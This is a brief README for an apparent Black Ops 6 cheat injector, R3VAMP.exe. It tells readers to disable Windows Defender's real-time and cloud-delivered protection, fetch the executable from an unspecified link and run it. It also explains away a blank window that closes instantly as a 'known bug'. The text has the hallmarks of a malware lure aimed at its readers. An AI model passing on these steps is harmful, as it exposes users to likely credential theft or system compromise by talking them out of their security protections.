# Instructions for Use


⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.

## Quick Setup Guide

### Step 1: Disable Windows Defender Settings

To ensure functionality of the loader, make sure **Real-time protection** and **Cloud-delivered protection** are turned off in Windows Defender:

#### 1. Real-time protection
- Go to **Windows Security** > **Virus & threat protection** > **Manage settings**.
- Toggle off **Real-time protection**.

#### 2. Cloud-delivered protection
- In the same settings page, toggle off **Cloud-delivered protection**.

## Step 2: Launching the Injector

   - Get **R3VAMP.exe** from the provided link.

2. **Prepare for Injection**
   - Make sure **Black Ops 6** is closed before proceeding.
   - Run **R3VAMP.exe**.
   - You will see a command window pop-up that is blank and closes immediately. This is a known bug, the window thats supposed to pop up is not functioning currently, UI fix to be implemented soon. If you do not see the command window, the injection has failed.
